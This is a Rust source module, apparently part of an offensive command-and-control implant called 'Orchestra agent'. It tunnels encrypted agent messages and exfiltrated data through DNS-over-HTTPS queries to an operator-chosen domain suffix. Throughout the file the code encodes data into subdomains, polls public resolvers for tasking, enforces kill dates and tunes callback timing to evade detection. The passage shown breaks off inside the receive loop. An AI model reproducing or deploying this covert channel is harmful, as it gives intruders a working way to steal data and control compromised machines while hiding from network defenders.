//! DNS-over-HTTPS (DoH) covert transport for the Orchestra agent.
//!
//! # Status: EXPERIMENTAL — not wired into the default startup path
//!
//! This module implements a `Transport` that tunnels agent messages over
//! DNS queries sent via DNS-over-HTTPS (DoH) or plaintext DNS. All DNS
//! transaction shaping — subdomain encoding, query prefix, suffix, chunk
//! size, jitter — is driven by the malleable C2 profile.
//!
//! ## Malleable DNS Transform Pipeline
//!
//! **Outbound (agent → server):**
//! 1. Encrypt payload with the session's AES-256-GCM key
//! 2. Encode the ciphertext (hex / base32 / base64url per profile)
//! 3. Chunk into DNS-safe subdomain labels (max 63 chars per label)
//! 4. Prepend the profile's query prefix (beacon / get_A / get_TXT / post)
//! 5. Append the profile's dns_suffix
//! 6. Send as DNS query via DoH (POST or GET) or plaintext DNS
//!
//! **Inbound (server → agent):**
//! 1. Extract answer data from the DNS response (A records or TXT strings)
//! 2. Decode (hex / base32 / base64url per profile)
//! 3. Decrypt with the session's AES-256-GCM key
//! 4. Deserialize the Message
//!
//! ## DNS-over-HTTPS
//!
//! When `profile.dns.headers.doh_server` is set, queries are sent as
//! RFC 8484 DoH requests. This makes DNS C2 traffic look like normal
//! HTTPS to a DNS provider. The DoH method (GET or POST) is configurable.
//!
//! ## Subdomain Encoding
//!
//! Three encoding modes are supported (set via `profile.dns.encoding`):
//! - `"hex"`: Standard hex encoding (default)
//! - `"base32"`: RFC 4648 base32, no padding (DNS-safe characters)
//! - `"base64url"`: URL-safe base64 with DNS-safe substitutions
//!
//! ## Security
//!
//! - The `agent_id` is encrypted before encoding into DNS queries
//! - SSL certificate pinning is enforced when `profile.ssl.cert_pin` is set
//! - Jitter comes from the profile's global config, not hardcoded values

use anyhow::{anyhow, Result};
use async_trait::async_trait;
use base64::Engine;
use common::{CryptoSession, Message, Transport};
use rand::Rng;
use sha2::{Digest, Sha256};
use std::sync::atomic::{AtomicU32, Ordering};
use std::sync::{Arc, Mutex};
use subtle::ConstantTimeEq;
use tokio::time::Duration;

use crate::malleable::MalleableProfile as AgentMalleableProfile;

/// Custom `ServerCertVerifier` that pins the server certificate by its
/// SHA-256 fingerprint (64 lowercase hex characters).  If the presented
/// end-entity certificate's DER encoding does not hash to the expected
/// fingerprint, the TLS handshake is rejected.
///
/// P1-06: After the fingerprint check passes, the server name (hostname) is
/// validated against the certificate's SAN/CN entries, matching the behaviour
/// in `c2_http::FingerprintVerifier`.  This prevents a valid-pinned cert from
/// being presented for the wrong hostname.
///
/// When `expected_fingerprint` is `None`, the verifier delegates to rustls's
/// built-in `WebPkiVerifier` with platform root certificates — i.e. standard
/// CA-based verification.
struct FingerprintVerifier {
    expected_fingerprint: Option<String>,
    /// P1-06: The expected server hostname for certificate name validation.
    hostname: String,
    webpki: rustls::client::WebPkiVerifier,
}

impl FingerprintVerifier {
    fn new(expected_fingerprint: Option<String>, hostname: String) -> Self {
        let mut root_store = rustls::RootCertStore::empty();
        for cert in rustls_native_certs::load_native_certs()
            .certs
            .into_iter()
            .map(|c| rustls::pki_types::CertificateDer::from(c.as_ref().to_vec()))
        {
            root_store.add(cert).ok();
        }
        let webpki = rustls::client::WebPkiVerifier::new(root_store, None);
        Self {
            expected_fingerprint,
            hostname,
            webpki,
        }
    }
}

impl rustls::client::danger::ServerCertVerifier for FingerprintVerifier {
    fn verify_server_cert(
        &self,
        end_entity: &rustls::pki_types::CertificateDer<'_>,
        intermediates: &[rustls::pki_types::CertificateDer<'_>],
        server_name: &rustls::pki_types::ServerName<'_>,
        ocsp_response: &[u8],
        now: rustls::pki_types::UnixTime,
    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        let digest = Sha256::digest(end_entity.as_ref());
        let hex_fp = hex::encode(digest);

        if let Some(ref expected) = self.expected_fingerprint {
            // Constant-time comparison to prevent timing side-channel attacks
            // that could brute-force the expected fingerprint byte-by-byte.
            let expected_lower = expected.to_lowercase();
            if !bool::from(hex_fp.as_bytes().ct_eq(expected_lower.as_bytes())) {
                tracing::error!("cert pinning: fingerprint mismatch — rejecting connection");
                return Err(rustls::Error::InvalidCertificate(
                    rustls::CertificateError::ApplicationVerificationFailure,
                ));
            }
            tracing::debug!("cert pinning: fingerprint verified OK");

            // P1-06: Validate that the certificate's SAN/CN matches the
            // expected hostname.  Without this check, a valid pinned cert
            // could be served for the wrong hostname (e.g. after SNI
            // rewriting or a compromised relay).
            if !common::tls_transport::verify_cert_hostname(end_entity.as_ref(), server_name) {
                tracing::error!(
                    "cert pinning: fingerprint matched but hostname validation failed for {:?}",
                    server_name
                );
                return Err(rustls::Error::InvalidCertificate(
                    rustls::CertificateError::NotValidForName,
                ));
            }

            Ok(rustls::client::danger::ServerCertVerified::assertion())
        } else {
            self.webpki.verify_server_cert(
                end_entity,
                intermediates,
                server_name,
                ocsp_response,
                now,
            )
        }
    }

    fn verify_tls12_signature(
        &self,
        message: &[u8],
        cert: &rustls::pki_types::CertificateDer<'_>,
        dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        self.webpki.verify_tls12_signature(message, cert, dss)
    }

    fn verify_tls13_signature(
        &self,
        message: &[u8],
        cert: &rustls::pki_types::CertificateDer<'_>,
        dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        self.webpki.verify_tls13_signature(message, cert, dss)
    }

    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        self.webpki.supported_verify_schemes()
    }
}

// ── Subdomain Encoding ───────────────────────────────────────────────────────

/// Encode binary data into a DNS-safe subdomain string.
///
/// Three modes are supported:
/// - `"hex"`: lowercase hex encoding (2 chars per byte)
/// - `"base32"`: RFC 4648 base32 without padding
/// - `"base64url"`: URL-safe base64 (+ → -, / → _)
fn encode_subdomain(data: &[u8], encoding: &str) -> String {
    match encoding {
        "base32" => {
            base32::encode(base32::Alphabet::RFC4648 { padding: false }, data).to_ascii_lowercase()
        }
        "base64url" => {
            let b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(data);
            // DNS-safe substitutions for extra safety.
            b64.replace('+', "-").replace('/', "_")
        }
        _ => {
            // Default: hex encoding.
            hex::encode(data)
        }
    }
}

/// Decode a DNS subdomain string back into binary data.
fn decode_subdomain(data: &str, encoding: &str) -> Result<Vec<u8>> {
    match encoding {
        "base32" => base32::decode(base32::Alphabet::RFC4648 { padding: false }, data)
            .ok_or_else(|| anyhow!("base32 decode failed for subdomain data")),
        "base64url" => {
            // Reverse DNS-safe substitutions.
            let corrected = data.replace('-', "+").replace('_', "/");
            base64::engine::general_purpose::URL_SAFE_NO_PAD
                .decode(&corrected)
                .map_err(|e| anyhow!("base64url decode failed: {}", e))
        }
        _ => hex::decode(data).map_err(|e| anyhow!("hex decode failed: {}", e)),
    }
}

/// Split an encoded string into DNS-safe subdomain labels.
///
/// Each label is at most 63 characters. Labels are separated by dots.
/// The total domain name must not exceed 253 characters; this function
/// does not enforce that — the caller must chunk at a higher level.
fn chunk_into_labels(encoded: &str, max_label_len: usize) -> Vec<String> {
    encoded
        .as_bytes()
        .chunks(max_label_len)
        .map(|c| String::from_utf8_lossy(c).to_string())
        .collect()
}

// ── DoH Transport ────────────────────────────────────────────────────────────

/// DNS-over-HTTPS transport driven by a malleable C2 profile.
///
/// All DNS query construction, encoding, chunking, and transport are
/// driven by the profile. The agent never hardcodes DNS patterns.
pub struct DohTransport {
    profile: Arc<AgentMalleableProfile>,
    client: reqwest::Client,
    session: CryptoSession,
    /// ECDH client state for forward-secrecy upgrade.  Once the handshake
    /// completes successfully this is set to `None` and `session` is replaced
    /// with the ECDH-derived key.
    ecdh_client: Option<Mutex<common::forward_secrecy::HttpEcdhClient>>,
    agent_id: String,
    /// Monotonic sequence counter for DNS query deduplication.
    seq: AtomicU32,
    /// Random session identifier embedded in DNS queries.
    session_id: u32,
    /// Legacy fields from common config for backward compat.
    doh_beacon_sentinel: String,
    host_header: String,
    /// Kill date from the malleable profile (YYYY-MM-DD). Checked on every
    /// send/recv cycle so that a passing kill date causes graceful termination
    /// even while the agent is long-running.
    kill_date: String,
    /// PSK used for the initial session and ECDH authentication.
    psk: Vec<u8>,
    /// Optional adaptive timing engine.  When `adaptive_timing_enabled`
    /// is `true` in the malleable profile, this timer learns network
    /// traffic patterns and adjusts callback timing to blend in.
    /// Shared across all C2 channels (HTTP, DoH) via `Arc`.
    #[cfg(feature = "adaptive-timing")]
    adaptive_timer: Option<Arc<crate::adaptive_timing::AdaptiveTimer>>,
}

/// Result of a DNS query together with the raw response byte length.
///
/// The byte count is used by adaptive timing telemetry so timing decisions
/// reflect actual network payload size rather than parsed JSON structure size.
struct DnsQueryResult {
    json: serde_json::Value,
    response_len: usize,
}

impl DohTransport {
    /// Create a new DoH transport from a malleable profile.
    ///
    /// The `common_profile` parameter provides legacy fields (doh_beacon_sentinel,
    /// host_header, etc.) that are not yet part of the malleable profile struct.
    pub async fn new(
        profile: &AgentMalleableProfile,
        psk: &str,
        agent_id: String,
        common_profile: Option<&common::config::MalleableProfile>,
    ) -> Result<Self> {
        // PSK-derived fallback session for backward compatibility with servers
        // that do not support ECDH.  Upgraded when the server responds to the
        // ECDH DNS query.
        let session = CryptoSession::from_shared_secret(psk.as_bytes());
        let ecdh_client = Some(Mutex::new(
            common::forward_secrecy::HttpEcdhClient::new(psk.as_bytes()),
        ));
        // Extract legacy config fields if provided.
        let doh_beacon_sentinel = common_profile
            .map(|p| p.doh_beacon_sentinel.clone())
            .unwrap_or_else(|| "1.2.3.4".to_string());
        let host_header = common_profile
            .map(|p| p.host_header.clone())
            .unwrap_or_default();
        let kill_date = common_profile
            .map(|p| p.kill_date.clone())
            .unwrap_or_default();

        // Build default headers for DoH.
        let mut headers = reqwest::header::HeaderMap::new();
        headers.insert(
            reqwest::header::USER_AGENT,
            reqwest::header::HeaderValue::from_str(&profile.global.user_agent)?,
        );
        headers.insert(
            reqwest::header::ACCEPT,
            reqwest::header::HeaderValue::from_static("application/dns-json"),
        );

        // Build the reqwest client with TLS configuration from the profile.
        let cert_fingerprint = if profile.has_cert_pin() {
            Some(profile.ssl.cert_pin.clone())
        } else {
            None
        };

        let client = if cert_fingerprint.is_some() {
            let verifier = FingerprintVerifier::new(cert_fingerprint, host_header.clone());
            let config = rustls::ClientConfig::builder()
                .dangerous()
                .with_custom_certificate_verifier(Arc::new(verifier))
                .with_no_client_auth();
            reqwest::Client::builder()
                .use_preconfigured_tls(config)
                .default_headers(headers)
                .build()?
        } else {
            reqwest::Client::builder()
                .use_rustls_tls()
                .default_headers(headers)
                .build()?
        };

        Ok(Self {
            profile: Arc::new(profile.clone()),
            client,
            session,
            ecdh_client,
            agent_id,
            seq: AtomicU32::new(0),
            session_id: rand::random(),
            doh_beacon_sentinel,
            host_header,
            kill_date,
            psk: psk.as_bytes().to_vec(),
            #[cfg(feature = "adaptive-timing")]
            adaptive_timer: None,
        })
    }

    /// Attach a shared adaptive timer to this transport.
    ///
    /// Call this after construction if `adaptive_timing_enabled` is `true`
    /// in the malleable profile.  The same `Arc<AdaptiveTimer>` should be
    /// shared across all C2 channels (HTTP, DoH).
    #[cfg(feature = "adaptive-timing")]
    pub fn set_adaptive_timer(&mut self, timer: Arc<crate::adaptive_timing::AdaptiveTimer>) {
        self.adaptive_timer = Some(timer);
    }

    /// Select the DoH resolver endpoint.
    ///
    /// Uses `profile.dns.headers.doh_server` if set; otherwise falls back
    /// to a random entry from the built-in resolver list.
    fn select_resolver(&self) -> String {
        let doh_server = &self.profile.dns.headers.doh_server;
        if !doh_server.is_empty() {
            return doh_server.clone();
        }
        // Fallback to built-in resolvers.
        const DOH_RESOLVERS: &[&str] = &[
            "https://cloudflare-dns.com/dns-query",
            "https://dns.google/resolve",
            "https://dns.quad9.net/dns-query",
        ];
        let idx = rand::thread_rng().gen_range(0..DOH_RESOLVERS.len());
        DOH_RESOLVERS[idx].to_string()
    }

    /// Resolve the DNS suffix. Uses `profile.dns.dns_suffix` if set,
    /// otherwise falls back to the legacy `host_header`.
    fn dns_suffix(&self) -> &str {
        let suffix = &self.profile.dns.dns_suffix;
        if !suffix.is_empty() {
            suffix
        } else {
            &self.host_header
        }
    }

    /// Build the full DNS query domain name.
    ///
    /// Format: `{encoded_subdomain}.{prefix}.{session_hex}.{suffix}`
    fn build_domain(&self, prefix: &str, encoded_data: &str) -> String {
        let session_hex = format!("{:x}", self.session_id);
        let suffix = self.dns_suffix();

        if encoded_data.is_empty() {
            format!("{}.{}.{}", prefix, session_hex, suffix)
        } else {
            // Chunk the encoded data into DNS-safe labels.
            let labels = chunk_into_labels(encoded_data, 63);
            let data_part = labels.join(".");
            format!("{}.{}.{}.{}", data_part, prefix, session_hex, suffix)
        }
    }

    /// Attempt ECDH forward-secrecy upgrade via a DNS query.
    ///
    /// Sends a DNS TXT query with the ECDH init payload encoded in the
    /// subdomain labels.  The server responds with its ECDH data in a
    /// TXT record.  On success the `session` field is replaced with the
    /// ECDH-derived session and `ecdh_client` is set to `None`.
    async fn try_ecdh_upgrade(&mut self) {
        // Only proceed if the handshake is still pending.
        let header_value = {
            let client = match self.ecdh_client.as_ref() {
                Some(c) => c,
                None => return,
            };
            match client.lock() {
                Ok(guard) => guard.header_value(),
                Err(_) => return,
            }
        };

        // The ECDH init payload is base64(pubkey_32 || hmac_32) = ~88 chars.
        // Encode it as a DNS-safe subdomain (base64url, no padding).
        let ecdh_data = header_value
            .replace('+', "-")
            .replace('/', "_")
            .trim_end_matches('=');

        let ecdh_prefix = common::ioc::IOC_DNS_ECDH;
        let domain = self.build_domain(ecdh_prefix, &ecdh_data);

        tracing::debug!("DoH ECDH init query: {}", domain);

        match self.execute_query(&domain, "TXT").await {
            Ok(result) => {
                // Extract TXT records from the DNS response.
                let answers = result.json.get("Answer");
                if let Some(records) = answers.and_then(|a| a.as_array()) {
                    for record in records {
                        if let Some(txt) = record.get("data").and_then(|d| d.as_str()) {
                            // Strip quotes if present.
                            let txt = txt.trim_matches('"');
                            // Decode the server's ECDH response.
                            let server_val = txt
                                .replace('-', "+")
                                .replace('_', "/");
                            if let Some(ecdh_mutex) = self.ecdh_client.as_ref() {
                                if let Ok(client) = ecdh_mutex.lock() {
                                    match client.derive_session_from_response(&server_val) {
                                        Ok(derived) => {
                                            tracing::info!(
                                                "DoH ECDH session established (session_id={:x})",
                                                self.session_id
                                            );
                                            self.session = derived;
                                            self.ecdh_client = None;
                                            return;
                                        }
                                        Err(e) => {
                                            tracing::warn!("DoH ECDH derivation failed: {}", e);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                tracing::debug!("DoH ECDH: no valid server response in TXT records");
            }
            Err(e) => {
                tracing::warn!("DoH ECDH init query failed: {}", e);
            }
        }
    }

    /// Execute a DNS query via DoH.
    ///
    /// Supports both GET (JSON) and POST (RFC 8484 wireformat) methods.
    async fn execute_query(&self, domain: &str, qtype: &str) -> Result<DnsQueryResult> {
        let doh_method = &self.profile.dns.headers.doh_method;
        let resolver = self.select_resolver();

        let qtype_val: u16 = match qtype {
            "A" => 1,
            "TXT" => 16,
            "AAAA" => 28,
            _ => 1,
        };

        let mut current_domain = domain.to_string();
        let max_cname_depth = 10;

        for _ in 0..max_cname_depth {
            let result = match doh_method.to_uppercase().as_str() {
                "POST" => self.execute_doh_post(&resolver, &current_domain, qtype).await,
                _ => self.execute_doh_get(&resolver, &current_domain, qtype).await,
            }?;

            // Check if we got any answers of the requested type.
            let has_direct_answer = result
                .json
                .get("Answer")
                .and_then(|a| a.as_array())
                .map(|arr| arr.iter().any(|r| r.get("type").and_then(|t| t.as_u64()) == Some(qtype_val as u64)))
                .unwrap_or(false);

            if has_direct_answer {
                return Ok(result);
            }

            // No direct answer — check for CNAME to follow.
            let cname_target = result
                .json
                .get("Answer")
                .and_then(|a| a.as_array())
                .and_then(|arr| {
                    arr.iter()
                        .filter(|r| r.get("type").and_then(|t| t.as_u64()) == Some(5))
                        .filter_map(|r| r.get("data").and_then(|d| d.as_str()))
                        .last()
                        .map(|s| s.to_string())
                });

            match cname_target {
                Some(target) => {
                    tracing::debug!(
                        "DNS CNAME chain: {} → {} (no {} records, following)",
                        current_domain,
                        target,
                        qtype
                    );
                    current_domain = target;
                }
                None => {
                    // No CNAME and no direct answer — return the empty result.
                    return Ok(result);
                }
            }
        }

        // CNAME chain too deep — return the last result we got.
        tracing::warn!(
            "DNS CNAME chain exceeded max depth ({}) for {}",
            max_cname_depth,
            domain
        );
        self.execute_doh_post(&resolver, &current_domain, qtype).await
    }

    /// Execute a DoH query using GET with JSON response (RFC 8484).
    async fn execute_doh_get(
        &self,
        resolver: &str,
        domain: &str,
        qtype: &str,
    ) -> Result<DnsQueryResult> {
        let url = format!("{}?name={}&type={}", resolver, domain, qtype);

        match self.client.get(&url).send().await {
            Ok(resp) => {
                let body = resp.bytes().await?;
                let response_len = body.len();
                let json: serde_json::Value = serde_json::from_slice(&body)?;
                Ok(DnsQueryResult { json, response_len })
            }
            Err(e) => {
                tracing::warn!("DoH GET query failed: {}", e);
                // Try fallback resolvers.
                self.execute_doh_get_fallback(domain, qtype).await
            }
        }
    }

    /// Try fallback DoH resolvers when the primary fails.
    async fn execute_doh_get_fallback(&self, domain: &str, qtype: &str) -> Result<DnsQueryResult> {
        const FALLBACKS: &[&str] = &[
            "https://cloudflare-dns.com/dns-query",
            "https://dns.google/resolve",
            "https://dns.quad9.net/dns-query",
        ];
        for resolver in FALLBACKS {
            let url = format!("{}?name={}&type={}", resolver, domain, qtype);
            match self.client.get(&url).send().await {
                Ok(resp) => {
                    let body = resp.bytes().await?;
                    let response_len = body.len();
                    let json: serde_json::Value = serde_json::from_slice(&body)?;
                    return Ok(DnsQueryResult { json, response_len });
                }
                Err(e) => {
                    tracing::warn!("DoH fallback {} failed: {}", resolver, e);
                    continue;
                }
            }
        }
        Err(anyhow!("All DoH resolvers failed for query '{}'", domain))
    }

    /// Execute a DoH query using POST with RFC 8484 wireformat.
    async fn execute_doh_post(
        &self,
        resolver: &str,
        domain: &str,
        qtype: &str,
    ) -> Result<DnsQueryResult> {
        // Build a DNS wireformat query.
        let wire_query = self.build_dns_wireformat(domain, qtype)?;

        let resp = self
            .client
            .post(resolver)
            .header("Content-Type", "application/dns-message")
            .header("Accept", "application/dns-message")
            .body(wire_query)
            .send()
            .await
            .map_err(|e| anyhow!("DoH POST query failed: {}", e))?;

        let bytes = resp.bytes().await?;
        let response_len = bytes.len();
        let json = self.parse_dns_wireformat_response(&bytes)?;
        Ok(DnsQueryResult { json, response_len })
    }

    /// Build a DNS wireformat query packet.
    fn build_dns_wireformat(&self, domain: &str, qtype: &str) -> Result<Vec<u8>> {
        // Simple DNS query builder.
        // Header: 12 bytes (ID, flags, QDCOUNT=1, ANCOUNT=0, NSCOUNT=0, ARCOUNT=0)
        // Question: QNAME + QTYPE(2) + QCLASS(2)
        let mut packet = Vec::with_capacity(256);

        // Transaction ID (random).
        let txid: u16 = rand::random();
        packet.extend_from_slice(&txid.to_be_bytes());

        // Flags: standard query (RD=1).
        packet.extend_from_slice(&[0x01, 0x00]);

        // QDCOUNT=1, rest 0.
        packet.extend_from_slice(&1u16.to_be_bytes());
        packet.extend_from_slice(&0u16.to_be_bytes());
        packet.extend_from_slice(&0u16.to_be_bytes());
        packet.extend_from_slice(&0u16.to_be_bytes());

        // QNAME: domain encoded as labels.
        for label in domain.split('.') {
            let label_bytes = label.as_bytes();
            packet.push(label_bytes.len() as u8);
            packet.extend_from_slice(label_bytes);
        }
        packet.push(0); // Root label.

        // QTYPE.
        let qtype_val: u16 = match qtype {
            "A" => 1,
            "TXT" => 16,
            "AAAA" => 28,
            _ => 1,
        };
        packet.extend_from_slice(&qtype_val.to_be_bytes());

        // QCLASS: IN = 1.
        packet.extend_from_slice(&1u16.to_be_bytes());

        Ok(packet)
    }

    /// Decompress / read a DNS domain name starting at `offset` in `data`.
    ///
    /// Handles both label sequences and compression pointers (RFC 1035 §4.1.4).
    /// Returns the dotted domain name as a string.
    fn decompress_dns_name(data: &[u8], mut offset: usize) -> String {
        let mut labels = Vec::new();
        let mut jumped = false;
        // Track the "next" position after the name so callers can advance
        // past the uncompressed portion.  Not returned here because the
        // callers only need the name string.
        let mut _end_offset = offset;
        let max_jumps = 32; // prevent infinite loops from malformed data

        for _ in 0..max_jumps {
            if offset >= data.len() {
                break;
            }
            let b = data[offset];
            if b == 0 {
                // End of name.
                if !jumped {
                    _end_offset = offset + 1;
                }
                break;
            } else if b >= 0xC0 {
                // Compression pointer.
                if offset + 1 >= data.len() {
                    break;
                }
                let ptr = (((b as usize) & 0x3F) << 8) | (data[offset + 1] as usize);
                if !jumped {
                    _end_offset = offset + 2;
                }
                jumped = true;
                offset = ptr;
            } else {
                // Length-prefixed label.
                let len = b as usize;
                if offset + 1 + len > data.len() {
                    break;
                }
                let label = String::from_utf8_lossy(&data[offset + 1..offset + 1 + len]);
                labels.push(label.to_string());
                if !jumped {
                    _end_offset = offset + 1 + len;
                }
                offset += 1 + len;
            }
        }
        labels.join(".")
    }

    /// Parse a DNS wireformat response into a JSON-like value.
    ///
    /// This is a minimal parser that extracts A, TXT, and CNAME answers.
    fn parse_dns_wireformat_response(&self, data: &[u8]) -> Result<serde_json::Value> {
        if data.len() < 12 {
            anyhow::bail!("DNS response too short");
        }

        // Parse header.
        let _ancount = u16::from_be_bytes([data[6], data[7]]) as usize;
        let _qdcount = u16::from_be_bytes([data[4], data[5]]) as usize;

        // Skip header.
        let mut pos = 12;

        // Skip question section.
        for _ in 0.._qdcount {
            // Skip QNAME.
            while pos < data.len() {
                let len = data[pos] as usize;
                if len == 0 {
                    pos += 1;
                    break;
                }
                // Check for compression pointer.
                if len >= 0xC0 {
                    pos += 2;
                    break;
                }
                pos += len + 1;
            }
            pos += 4; // QTYPE + QCLASS
        }

        // Parse answer section.
        let mut answers = Vec::new();

        for _ in 0.._ancount {
            if pos + 12 > data.len() {
                break;
            }

            // Skip name (could be a compression pointer).
            if data[pos] >= 0xC0 {
                pos += 2;
            } else {
                while pos < data.len() && data[pos] != 0 {
                    pos += data[pos] as usize + 1;
                }
                pos += 1;
            }

            let rtype = u16::from_be_bytes([data[pos], data[pos + 1]]);
            let _rdlength = u16::from_be_bytes([data[pos + 8], data[pos + 9]]) as usize;
            pos += 10;

            if pos + _rdlength > data.len() {
                break;
            }

            match rtype {
                1 => {
                    // A record: 4 bytes → IPv4 address.
                    if _rdlength == 4 {
                        let ip = format!(
                            "{}.{}.{}.{}",
                            data[pos],
                            data[pos + 1],
                            data[pos + 2],
                            data[pos + 3]
                        );
                        answers.push(serde_json::json!({
                            "type": 1,
                            "data": ip
                        }));
                    }
                }
                16 => {
                    // TXT record: one or more character-strings.
                    let mut txt_data = String::new();
                    let mut txt_pos = pos;
                    while txt_pos < pos + _rdlength {
                        let str_len = data[txt_pos] as usize;
                        txt_pos += 1;
                        if txt_pos + str_len > data.len() {
                            break;
                        }
                        txt_data
                            .push_str(&String::from_utf8_lossy(&data[txt_pos..txt_pos + str_len]));
                        txt_pos += str_len;
                    }
                    answers.push(serde_json::json!({
                        "type": 16,
                        "data": txt_data
                    }));
                }
                5 => {
                    // CNAME record: RDATA is a domain name (possibly compressed).
                    let cname = Self::decompress_dns_name(data, pos);
                    answers.push(serde_json::json!({
                        "type": 5,
                        "data": cname
                    }));
                }
                _ => {}
            }

            pos += _rdlength;
        }

        Ok(serde_json::json!({ "Answer": answers }))
    }

    /// Check for a "tasking available" sentinel in A record answers.
    fn check_tasking_sentinel(&self, json: &serde_json::Value) -> bool {
        json.get("Answer")
            .and_then(|a| a.as_array())
            .map(|arr| {
                arr.iter().any(|r| {
                    r.get("data")
                        .and_then(|d| d.as_str())
                        .map(|s| s.trim() == self.doh_beacon_sentinel)
                        .unwrap_or(false)
                })
            })
            .unwrap_or(false)
    }

    /// Decode A record answers into raw bytes (4 bytes per IPv4 address).
    fn decode_a_records(&self, json: &serde_json::Value) -> Vec<u8> {
        let mut bytes = Vec::new();
        if let Some(answers) = json.get("Answer").and_then(|a| a.as_array()) {
            for record in answers {
                if record.get("type").and_then(|t| t.as_u64()) == Some(1) {
                    if let Some(ip_str) = record.get("data").and_then(|d| d.as_str()) {
                        // Skip the idle sentinel IP.
                        if ip_str.trim() == self.doh_beacon_sentinel {
                            continue;
                        }
                        // Skip the dns_idle address.
                        if ip_str.trim() == self.profile.global.dns_idle {
                            continue;
                        }
                        for octet in ip_str.trim().split('.') {
                            if let Ok(b) = octet.parse::<u8>() {
                                bytes.push(b);
                            }
                        }
                    }
                }
            }
        }
        bytes
    }

    /// Concatenate TXT record strings from the answer section.
    fn extract_txt_records(&self, json: &serde_json::Value) -> String {
        let mut result = String::new();
        if let Some(answers) = json.get("Answer").and_then(|a| a.as_array()) {
            for record in answers {
                if record.get("type").and_then(|t| t.as_u64()) == Some(16) {
                    if let Some(data) = record.get("data").and_then(|d| d.as_str()) {
                        result.push_str(data.trim_matches('"'));
                    }
                }
            }
        }
        result
    }

    /// Calculate jittered sleep duration.
    ///
    /// When an adaptive timer is attached and has completed its learning
    /// phase, uses the timer's learned profile to produce realistic timing.
    /// Otherwise falls back to the malleable profile's `jittered_sleep()`.
    fn jittered_sleep(&self) -> Duration {
        #[cfg(feature = "adaptive-timing")]
        if let Some(ref timer) = self.adaptive_timer {
            if timer.state() != crate::adaptive_timing::TimerState::Learning {
                return timer.next_callback_time();
            }
        }
        self.profile.jittered_sleep()
    }

    /// Record a traffic observation with the adaptive timer (if present).
    ///
    /// This is a no-op when the `adaptive-timing` feature is disabled or
    /// when no timer has been attached.  The timer passively learns from
    /// all observed network traffic to build a realistic timing profile.
    #[cfg(feature = "adaptive-timing")]
    fn observe_traffic(
        &self,
        bytes_sent: usize,
        bytes_received: usize,
        direction: crate::adaptive_timing::Direction,
        protocol: crate::adaptive_timing::Protocol,
    ) {
        if let Some(ref timer) = self.adaptive_timer {
            timer.observe(crate::adaptive_timing::TrafficObservation {
                timestamp: std::time::Instant::now(),
                bytes_sent,
                bytes_received,
                direction,
                protocol,
                source: crate::adaptive_timing::TrafficSource::Agent,
            });
        }
    }

    /// No-op when adaptive timing is disabled.
    #[cfg(not(feature = "adaptive-timing"))]
    fn observe_traffic(
        &self,
        _bytes_sent: usize,
        _bytes_received: usize,
        _direction: (),
        _protocol: (),
    ) {
    }

    /// Get the encoding mode from the profile.
    fn encoding(&self) -> &str {
        &self.profile.dns.encoding
    }

    /// Get the max TXT chunk size from the profile.
    fn max_txt_size(&self) -> u16 {
        self.profile.dns.max_txt_size
    }

    /// Get the beacon prefix from the profile.
    fn beacon_prefix(&self) -> &str {
        let beacon = &self.profile.dns.beacon;
        if !beacon.is_empty() {
            beacon
        } else {
            // Fallback to IOC beacon prefix.
            ""
        }
    }

    /// Get the post (exfil) prefix from the profile.
    fn post_prefix(&self) -> &str {
        let post = &self.profile.dns.post;
        if !post.is_empty() {
            post
        } else {
            // Fallback to IOC task prefix.
            ""
        }
    }

    /// Get the get_TXT prefix from the profile.
    fn get_txt_prefix(&self) -> &str {
        let get_txt = &self.profile.dns.get_TXT;
        if !get_txt.is_empty() {
            get_txt
        } else {
            ""
        }
    }

    /// Get the get_A prefix from the profile.
    fn get_a_prefix(&self) -> &str {
        let get_a = &self.profile.dns.get_A;
        if !get_a.is_empty() {
            get_a
        } else {
            ""
        }
    }
}

#[async_trait]
impl Transport for DohTransport {
    async fn send(&mut self, msg: Message) -> Result<()> {
        tracing::debug!("Malleable DoH C2 Send (data exfiltration)");

        // Enforce kill date on every send cycle.
        if !self.kill_date.is_empty() {
            crate::config::check_kill_date(&self.kill_date)?;
        }

        // Serialize and encrypt the payload.
        let serialized = bincode::serde::encode_to_vec(&msg, bincode::config::legacy())?;
        let ciphertext = self.session.encrypt(&serialized);

        // Encode the ciphertext using the profile's encoding mode.
        let encoded = encode_subdomain(&ciphertext, self.encoding());

        // Determine the prefix for data exfiltration queries.
        let prefix = self.post_prefix();

        // Calculate chunk size in encoded characters. Each encoded character
        // maps to a subdomain label, so we chunk at the max_txt_size boundary.
        let max_chunk_chars = self.max_txt_size() as usize;

        // Send in chunks, each as a separate DNS query.
        let chunks: Vec<&str> = encoded
            .as_bytes()
            .chunks(max_chunk_chars)
            .map(|c| std::str::from_utf8(c).unwrap_or(""))
            .collect();

        for chunk in &chunks {
            self.seq.fetch_add(1, Ordering::Relaxed);
            let domain = self.build_domain(prefix, chunk);

            // Send via TXT query to exfiltrate data.
            let _ = self.execute_query(&domain, "TXT").await?;

            // Observe the outbound DNS traffic for adaptive timing.
            #[cfg(feature = "adaptive-timing")]
            self.observe_traffic(
                chunk.len(),
                0,
                crate::adaptive_timing::Direction::Outbound,
                crate::adaptive_timing::Protocol::DNS,
            );

            // Sleep between fragments with profile-driven jitter.
            let sleep_dur = self.jittered_sleep();
            let frag_delay = Duration::from_millis(sleep_dur.as_millis() as u64 / 10);
            crate::memory_guard::guarded_sleep(frag_delay, None, 0).await?;
        }

        Ok(())
    }

    async fn recv(&mut self) -> Result<Message> {
        tracing::debug!("Malleable DoH C2 Recv (task fetch)");

        // Enforce kill date on every recv cycle.
        if !self.kill_date.is_empty() {
            crate::config::check_kill_date(&self.kill_date)?;
        }

        // Attempt ECDH forward-secrecy upgrade on the first recv cycle.
        // The handshake runs once; subsequent calls are no-ops once the
        // ECDH client is consumed.
        self.try_ecdh_upgrade().await;

        // Beacon loop: query for tasking availability.
        loop {
            // Build the beacon query domain.
            let beacon_prefix = self.beacon_prefix();
            let beacon_domain = self.build_domain(beacon_prefix, "");

            // Send beacon query as A record lookup.
            let beacon_response = self.execute_query(&beacon_domain, "A").await?;

            // Observe the inbound DNS response for adaptive timing.
